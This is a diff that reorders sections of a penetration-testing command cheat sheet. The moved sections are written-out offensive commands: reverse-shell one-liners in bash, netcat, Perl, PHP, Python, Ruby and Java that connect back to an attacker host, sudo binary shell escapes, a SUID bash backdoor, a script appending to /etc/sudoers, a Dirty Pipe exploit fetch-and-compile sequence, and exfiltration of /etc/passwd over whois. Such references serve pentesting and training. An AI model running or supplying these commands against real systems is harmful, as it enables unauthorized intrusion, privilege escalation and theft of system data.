@@ -224,124 +224,6 @@ systemctl restart networking.service            Restart networking
 curl ifconfig.me                                Show external IP
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Privilege Escalation
-
-- Enumeration
-cat /etc/sysconfig/network                      Hostname and domain name
-ifconfig                                        IP addresses to all network interfaces
-route                                           Gateway
-cat /etc/resolv.conf                            DNS
-netstat -antp                                   Show ports that are listening
-arp -e
-cat /etc/issue                                  OS info
-cat /proc/version                               OS name
-uname -a                                        Kernel info
-cat /sys/class/dmi/id/product_name              Computer model
-cat /etc/exports
-
-- Search for exploits
-searchsploit linux kernel ubuntu 16.04
-
-- Search for passwords and keys
-find / -name "*password*"
-find / -name "id_rsa"
-
-- Check for bad permissions
-find / -perm -4000 2>/dev/null                             Binaries with the SUID bit set - run the file with permissions of its owner
-find / -user root -perm -6000 -print 2>/dev/null           Binaries with the SGID bit set - run the file with permissions of the owner's group
-find / -perm -1000 2>/dev/null                             Binaries with the sticky bit set - only the owner of a directory or a file can delete or rename
-
-find / -perm -o+w -type f 2>/dev/null                      World writable files
-find / -writable -type d 2>/dev/null                       World writable folders
-
-find / -perm -o+x -type f 2>/dev/null                      World executable files
-find / -perm -o+x -type d 2>/dev/null                      World executable folders
-find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null     World writable & world executable folders
-
-- Enumeration scripts (suggested order)
-wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
-wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
-wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
-wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
-wget https://downloads.cisofy.com/lynis/lynis-3.0.4.tar.gz     cd lynis; ./lynis audit system
-
-- sudoers
-sudo -l                                                    Users that can run specific binaries with root permissions
-
-User www-data may run the following commands on winxp:
-     (root) NOPASSWD: /usr/bin/strace
-
-sudo /usr/bin/strace cp /bin/bash /tmp/backdoor            Make a copy of bash
-sudo /usr/bin/strace chmod 4755 /tmp/backdoor              Assign it a SUID bit
-/tmp/backdoor -p                                           Run with -p to maintain the SUID privileges
-id                                                         You should now have a uid of 0 (root)
-
-- Abusing binaries
-sudo apache2 -f /etc/shadow                                A way to view a system file
-sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"
-sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
-sudo apt changelog apt                                 !/bin/sh then hit enter
-sudo awk 'BEGIN {system("/bin/bash")}'
-sudo ed                                                    !/bin/sh then hit enter
-sudo env /bin/bash
-sudo find /home -exec /bin/bash \;
-sudo git help add                                          !/bin/sh then hit enter
-touch tmp
-find tmp -exec whoami \;                                   Find a file then execute a command
-find tmp -exec netcat -lvp 443 -e /bin/sh \;
-
-sudo ftp
-! /bin/bash
-
-sudo less /etc/passwd                                      !/bin/sh then hit enter
-sudo man man                                               !/bin/sh then hit enter
-sudo more /etc/passwd                                      !/bin/sh then hit enter
-echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
-sudo perl -e 'exec "/bin/bash";'
-sudo python -c 'import pty;pty.spawn("/bin/bash")'
-sudo scp /etc/passwd lee@10.0.0.5:~/
-
-socat file:`tty`,raw,echo=0 tcp-listen:443                 Attack VM
-sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:443
-
-sudo vi                                                    :!bash
-sudo vi                                                    !/bin/sh then hit enter
-sudo vi                                                    :set shell=/bin/bash:shell
-sudo vi                                                    :shell
-
-- Abusing the PATH variable
-After escaping a restricted shell, export “/bin/bash” as a SHELL environment variable
-and “/usr/bin” as a PATH environment variable so that we can run Linux commands properly.
-export PATH=/bin:/usr/bin:$PATH
-export SHELL=/bin/bash:$SHELL
-
-- Add a user to the sudoers file
-#!/usr/bin/env python
-import os
-import sys
-try:
-    os.system('echo "lee ALL= (root) NOPASSWD: /usr/bin/apach2, /usr/bin/awk, /usr/bin/find" >> /etc/sudoers')
-except:
-    sys.exit()
-
-- Cron jobs
-crontab -l                                      Check for entries
-ls -l /etc/cron*                                Scheduled cron jobs
-
-What files are owned by a particular user, but are not present in their home directory?
-What are the files present in the /home/user folder? Are there any hidden files and folders?
-What groups does the user belong to?
-
-- Dirty Pipe (CVE-2022-0847)
-Requires Linux 5.8 or later.
-wget https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c
-gcc dirtypipez.c -o dirtypipez
-find / -perm 4000 2>/dev/null
-./dirtypipez <binary>
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Processes
 
 ps fawwwux                                      Show running processes
@@ -381,46 +263,6 @@ rdesktop -u <username> -p <password> -g 75% 10.0.0.10
 
 If Network Level Authentication is enabled:
 xfreerdp /u:user /p:password /v:10.0.0.10:port /size:75%h +drives
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Reverse shells
-
-- Setup a local listener
-nc -lvp 443			                       Setup a listen on the attack box
-
-- Bash shell
-bash -i >& /dev/tcp/10.0.0.10/443 0>&1
-
-- Java
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-
-- Netcat Linux
-nc -e /bin/sh 10.0.0.10 443
-
-- Netcat Windows
-nc -e cmd.exe 10.0.0.10 443
-
-- Netcat without -e flag
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 443 > /tmp/f
-
-- Perl
-perl -e 'use Socket;$i="10.0.0.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
-- PHP
-<?php exec('nc 10.0.0.10 443 -e /bin/bash') ?>
-
-- Python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-- Ruby
-ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-
-- xterm
-xterm -display 10.0.0.10:1                      target - it will connect back to you on TCP port 6001
-Xnest :1                                        attacker - catch the incoming xterm, start an X-Server
-xhost +<target IP>                              attacker - authorize the target to connect to you
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Screen
@@ -634,23 +476,6 @@ OS X                                            Applications > VNC Viewer: local
 Terminate on Remote Kali                        vncserver -kill :1
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Upgrade to a full TTY session
-
-awk                                             awk 'BEGIN {system("/bin/bash")}'
-find                                            find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
-Lua                                             os.execute('/bin/sh')
-nmap                                            !sh
-nmap                                            --interactive
-Perl                                            perl —e 'exec "/bin/bash";'
-Perl                                            exec "/bin/sh";
-Python                                          python -c 'import pty; pty.spawn("/bin/bash")'
-Ruby                                            exec "/bin/sh"
-sh                                              /bin/bash
-Within IRB                                      exec "/bin/sh"
-Within vi                                       :!bash
-Within vi                                       :set shell=/bin/bash:shell
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # User Accounts
 
 whoami                                          Who are you logged in as
@@ -753,14 +578,6 @@ Enter the replacement character.
 :wq
 <return>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# whois Data Exfil
-
-nc -lvp 43 | sed "s/ //g" | base64 -d                       Attacker
-whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`     Target
-
-- additional method
-rlogin -l "$(cat /etc/passwd)" -p port <target IP>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Anonymous Mountable CIFS
@@ -793,9 +610,193 @@ smb: \> cd "<long directory>"
 smb: \> get <file>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Privilege Escalation
+
+- Enumeration
+cat /etc/sysconfig/network                      Hostname and domain name
+ifconfig                                        IP addresses to all network interfaces
+route                                           Gateway
+cat /etc/resolv.conf                            DNS
+netstat -antp                                   Show ports that are listening
+arp -e
+cat /etc/issue                                  OS info
+cat /proc/version                               OS name
+uname -a                                        Kernel info
+cat /sys/class/dmi/id/product_name              Computer model
+cat /etc/exports
+
+- Search for exploits
+searchsploit linux kernel ubuntu 16.04
+
+- Search for passwords and keys
+find / -name "*password*"
+find / -name "id_rsa"
+
+- Check for bad permissions
+find / -perm -4000 2>/dev/null                             Binaries with the SUID bit set - run the file with permissions of its owner
+find / -user root -perm -6000 -print 2>/dev/null           Binaries with the SGID bit set - run the file with permissions of the owner's group
+find / -perm -1000 2>/dev/null                             Binaries with the sticky bit set - only the owner of a directory or a file can delete or rename
+
+find / -perm -o+w -type f 2>/dev/null                      World writable files
+find / -writable -type d 2>/dev/null                       World writable folders
+
+find / -perm -o+x -type f 2>/dev/null                      World executable files
+find / -perm -o+x -type d 2>/dev/null                      World executable folders
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null     World writable & world executable folders
+
+- Enumeration scripts (suggested order)
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
+wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
+wget https://downloads.cisofy.com/lynis/lynis-3.0.4.tar.gz     cd lynis; ./lynis audit system
+
+- sudoers
+sudo -l                                                    Users that can run specific binaries with root permissions
+
+User www-data may run the following commands on winxp:
+     (root) NOPASSWD: /usr/bin/strace
+
+sudo /usr/bin/strace cp /bin/bash /tmp/backdoor            Make a copy of bash
+sudo /usr/bin/strace chmod 4755 /tmp/backdoor              Assign it a SUID bit
+/tmp/backdoor -p                                           Run with -p to maintain the SUID privileges
+id                                                         You should now have a uid of 0 (root)
+
+- Abusing binaries
+sudo apache2 -f /etc/shadow                                A way to view a system file
+sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+sudo apt changelog apt                                     !/bin/sh then hit enter
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo ed                                                    !/bin/sh then hit enter
+sudo env /bin/bash
+sudo find /home -exec /bin/bash \;
+sudo git help add                                          !/bin/sh then hit enter
+touch tmp
+find tmp -exec whoami \;                                   Find a file then execute a command
+find tmp -exec netcat -lvp 443 -e /bin/sh \;
+
+sudo ftp
+! /bin/bash
+
+sudo less /etc/passwd                                      !/bin/sh then hit enter
+sudo man man                                               !/bin/sh then hit enter
+sudo more /etc/passwd                                      !/bin/sh then hit enter
+echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
+sudo perl -e 'exec "/bin/bash";'
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+sudo scp /etc/passwd lee@10.0.0.5:~/
+
+socat file:`tty`,raw,echo=0 tcp-listen:443                 Attack VM
+sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:443
+
+sudo vi                                                    :!bash
+sudo vi                                                    !/bin/sh then hit enter
+sudo vi                                                    :set shell=/bin/bash:shell
+sudo vi                                                    :shell
+
+- Abusing the PATH variable
+After escaping a restricted shell, export “/bin/bash” as a SHELL environment variable
+and “/usr/bin” as a PATH environment variable so that we can run Linux commands properly.
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+
+- Add a user to the sudoers file
+#!/usr/bin/env python
+import os
+import sys
+try:
+    os.system('echo "lee ALL= (root) NOPASSWD: /usr/bin/apach2, /usr/bin/awk, /usr/bin/find" >> /etc/sudoers')
+except:
+    sys.exit()
+
+- Cron jobs
+crontab -l                                      Check for entries
+ls -l /etc/cron*                                Scheduled cron jobs
+
+What files are owned by a particular user, but are not present in their home directory?
+What are the files present in the /home/user folder? Are there any hidden files and folders?
+What groups does the user belong to?
+
+- Dirty Pipe (CVE-2022-0847)
+Requires Linux 5.8 or later.
+wget https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c
+gcc dirtypipez.c -o dirtypipez
+find / -perm 4000 2>/dev/null
+./dirtypipez <binary>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Reverse shells
+
+- Setup a local listener
+nc -lvnp 443			                       Setup a listen on the attack box
+
+- Bash shell
+bash -i >& /dev/tcp/10.0.0.10/443 0>&1
+
+- Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+- Netcat Linux
+nc -e /bin/sh 10.0.0.10 443
+
+- Netcat Windows
+nc -e cmd.exe 10.0.0.10 443
+
+- Netcat without -e flag
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 443 > /tmp/f
+
+- Perl
+perl -e 'use Socket;$i="10.0.0.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+- PHP
+<?php exec('nc 10.0.0.10 443 -e /bin/bash') ?>
+
+- Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+- Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+- xterm
+xterm -display 10.0.0.10:1                      target - it will connect back to you on TCP port 6001
+Xnest :1                                        attacker - catch the incoming xterm, start an X-Server
+xhost +<target IP>                              attacker - authorize the target to connect to you
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Rstatd enabled
 
 rsysinfo <target IP>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Upgrade to a full TTY session
+
+awk                                             awk 'BEGIN {system("/bin/bash")}'
+find                                            find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+Lua                                             os.execute('/bin/sh')
+nmap                                            !sh
+nmap                                            --interactive
+Perl                                            perl —e 'exec "/bin/bash";'
+Perl                                            exec "/bin/sh";
+Python                                          python -c 'import pty; pty.spawn("/bin/bash")'
+Ruby                                            exec "/bin/sh"
+sh                                              /bin/bash
+Within IRB                                      exec "/bin/sh"
+Within vi                                       :!bash
+Within vi                                       :set shell=/bin/bash:shell
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# whois Data Exfil
+
+nc -lvnp 43 | sed "s/ //g" | base64 -d                      Attacker
+whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`     Target
+
+- additional method
+rlogin -l "$(cat /etc/passwd)" -p port <target IP>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # X11 Unauthenticated Access
@@ -824,5 +825,5 @@ xrdp.py <target IP:display #>
 - Reverse shell
 xrdp.py <target IP:display #> –no-disp
 It will prompt a new control pane where we can see the R-shell option.
-nc -lvp 443
+nc -lvnp 443
 Go back to the window and enter the attackerIP:port, then select R-Shell.
